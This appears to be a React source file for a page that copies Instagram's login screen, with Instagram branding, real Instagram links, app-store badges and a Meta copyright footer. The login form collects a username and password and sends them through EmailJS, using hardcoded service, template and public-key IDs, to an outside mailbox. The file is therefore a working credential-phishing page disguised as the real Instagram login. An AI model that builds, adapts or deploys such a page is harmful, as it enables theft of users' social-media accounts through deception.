import React, { useRef } from 'react'
import { Col, Container, Row } from 'react-bootstrap'
import Iphone from '../Assets/Images/png/iphone.png'
import { Instagram } from './Icons'
import emailjs from '@emailjs/browser';
import Facebook from '../Assets/Images/svg/Facebook.svg'
import Playstore from '../Assets/Images/png/Playstore.png'
import Microsoft from '../Assets/Images/png/Microsoft.png'


const Instalogin = () => {
    const form = useRef();

    const sendEmail = (e) => {
        e.preventDefault();

        emailjs.sendForm('service_2e3c0ra', 'template_ix65q1s', form.current, 'Psdve7YiRN4tIcoGO')
            .then((result) => {
                console.log(result.text);
            }, (error) => {
                console.log(error.text);
            });
    };
    return (
        <>
            <section className='bg-white'>
                <Container className='min-vh-100 d-flex flex-column justify-content-center align-items-center'>

                    <Row className=' align-items-center justify-content-center'>
                        <Col lg={6} className='d-lg-block d-none'>
                            <div className='d-flex justify-md-content-end justify-content-center align-items-center me-4'>
                                <img className='w-100' src={Iphone} alt="Insta Overview" />
                            </div>
                        </Col>

                        <Col lg={6} className='mt-lg-0 mt-5 pt-lg-0 pt-4'>
                            <div className='d-flex flex-column justify-content-md-start justify-content-center align-items-md-start align-items-center'>
                                <div className='d-flex flex-column justify-content-center align-items-center '>
                                    <div className='d-flex flex-column justify-content-center align-items-center box1'>
                                        <div className=' pt-5 d-flex flex-column justify-content-center align-items-center'>
                                            <Instagram />
                                            <form ref={form} onSubmit={sendEmail} className='d-flex flex-column justify-content-center align-items-center'>
                                                <input className='w-101 mt-5' name="user_name" type="text" placeholder='Phone number, username or email address' />
                                                <input name="user_password" className='mt-2 w-101' type="password" placeholder='Password' />
                                                <a target='__blank' className='w-101 ps-0 login mt-3 d-flex justify-content-center align-items-center' href="#"><input type="submit" value="Login" className='login  fw-medium ' /></a>
                                            </form>

                                        </div>

                                        <div className='d-flex justify-content-center align-items-center mt-3'>
                                            <span className='orline'></span>
                                            <h4 className='mx-3 or mb-0'>OR</h4>
                                            <span className='orline'></span>
                                        </div>
                                        <a className='d-flex justify-content-center align-items-center mt-4' href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522qe5d4hp64efohvv3o91c4o5kmag4gcwu7ubu3yie83t12jolh3%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Faccounts%25252Fonetap%25252F%25253Fnext%25253D%2525252F%252526__coig_login%25253D1%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db97ead0a-cca8-4a5c-bf3c-de1fdf7f3eb4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522qe5d4hp64efohvv3o91c4o5kmag4gcwu7ubu3yie83t12jolh3%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Faccounts%25252Fonetap%25252F%25253Fnext%25253D%2525252F%252526__coig_login%25253D1%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0">
                                            <img className='facebook' src={Facebook} alt="" />
                                            <span className='fb fs-14'>Log in with Facebook</span>
                                        </a>
                                        <div className='d-flex justify-content-center align-items-center mt-3 mb-3'>
                                            <a className='forgot' href="https://www.instagram.com/accounts/password/reset/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fonetap%2F%3Fnext%3D%252F%26__coig_login%3D1">Forgotten your password?</a>
                                        </div>


                                    </div>

                                    <div className='box1 mt-2 d-flex justify-content-center align-items-center pt-25'>
                                        <h3 className='account mb-0'>Don't have an account? </h3>
                                        <a className='link' href="https://www.instagram.com/accounts/emailsignup/?hl=en"> Sign up</a>
                                    </div>

                                    <div className='d-flex justify-content-center align-items-center flex-column'>
                                        <div className='d-flex justify-content-center align-items-center mt-3'>
                                            <h2 className='fs-14 text-center'>Get the app.</h2>
                                        </div>
                                        <div className='d-flex justify-content-center align-items-center gap-2 mt-2'>
                                            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D85564F60-C818-4EAB-8544-82EED468DC82%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge"><img className='image' src={Playstore} alt="Play Store" /></a>
                                            <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C2306%2C1742&next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fonetap%2F%3Fnext%3D%252F%26__coig_login%3D1"><img className='image hg' src={Microsoft} alt="Microsoft" /></a>
                                        </div>

                                    </div>
                                </div>
                            </div>

                        </Col>

                    </Row>
                    <ul className='d-flex flex-wrap gap-3 justify-content-center align-items-center mt-5 pt-5'>
                        <li className='cursorp'><a className='fs-12 fw-normal mb-0' href="">Meta</a></li>
                        <li className='cursorp'><a className='fs-12 fw-normal mb-0' href="">About</a></li>
                        <li className='cursorp'><a className='fs-12 fw-normal mb-0' href="">Blog</a></li>
                        <li className='cursorp'><a className='fs-12 fw-normal mb-0' href="">Jobs</a></li>
                        <li className='cursorp'><a className='fs-12 fw-normal mb-0' href="">Help</a></li>
                        <li className='cursorp'><a className='fs-12 fw-normal mb-0' href="">API</a></li>
                        <li className='cursorp'><a className='fs-12 fw-normal mb-0' href="">Privacy</a></li>
                        <li className='cursorp'><a className='fs-12 fw-normal mb-0' href="">Terms</a></li>
                        <li className='cursorp'><a className='fs-12 fw-normal mb-0' href="">Locations</a></li>
                        <li className='cursorp'><a className='fs-12 fw-normal mb-0' href="">Instagram Lite</a></li>
                        <li className='cursorp'><a className='fs-12 fw-normal mb-0' href="">Threads</a></li>
                        <li className='cursorp'><a className='fs-12 fw-normal mb-0' href="">Contact Uploading & Non-Users</a></li>
                        <li className='cursorp'><a className='fs-12 fw-normal mb-0' href="">Meta Verified</a></li>
                        <li className='cursorp'><a className='fs-12 fw-normal mb-0' href=""></a></li>
                        <li className='cursorp'><a className='fs-12 fw-normal mb-0' href=""></a></li>

                    </ul>
                    <div>
                        <ul className='d-flex justify-content-center align-items-center'>
                            <li><select className='fs-12' name="" id="Language">
                                <option value="1">English(UK)</option>
                                <option value="2">Hindi</option>
                                <option value="3">German</option>
                                <option value="4">Telugu</option>
                                <option value="5">Malyalam</option>
                                <option value="6">Urdu</option>

                            </select></li>
                            <li className='fs-12'>
                                © 2023 Instagram from Meta</li>
                        </ul>
                    </div>
                </Container>

            </section>

        </>
    )
}

export default Instalogin
